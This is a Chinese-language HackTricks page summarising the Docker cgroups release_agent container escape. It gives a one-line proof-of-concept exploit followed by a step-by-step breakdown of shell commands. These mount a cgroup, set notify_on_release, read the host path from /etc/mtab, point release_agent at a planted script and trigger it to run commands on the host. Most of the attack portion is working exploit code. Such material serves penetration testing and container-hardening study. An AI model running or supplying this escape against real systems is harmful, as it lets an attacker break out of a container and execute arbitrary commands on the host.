# Docker release\_agent cgroups逃逸

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


**有关更多详细信息，请参阅[原始博客文章](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)。** 这只是一个摘要：

原始PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
这个概念验证（PoC）演示了通过创建一个`release_agent`文件并触发其调用来利用cgroups的方法，在容器主机上执行任意命令。以下是涉及的步骤详细说明：

1. **准备环境：**
- 创建一个目录`/tmp/cgrp`，用作cgroup的挂载点。
- 将RDMA cgroup控制器挂载到此目录。如果缺少RDMA控制器，建议使用`memory` cgroup控制器作为替代方案。
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **设置子Cgroup:**
- 在挂载的cgroup目录中创建一个名为"x"的子cgroup。
- 通过向其notify_on_release文件写入1来启用"x" cgroup的通知。
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **配置释放代理:**
- 从 /etc/mtab 文件中获取容器在主机上的路径。
- 然后配置 cgroup 的 release_agent 文件以执行位于获取的主机路径上的名为 /cmd 的脚本。
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **创建和配置/cmd脚本:**
- 在容器内创建/cmd脚本，并配置其执行ps aux命令，将输出重定向到容器中名为/output的文件中。指定主机上/output的完整路径。
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **触发攻击:**
- 在"x"子cgroup中启动一个进程，然后立即终止。
- 这将触发`release_agent`（/cmd脚本），该脚本在主机上执行ps aux命令，并将输出写入容器中的/output。
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
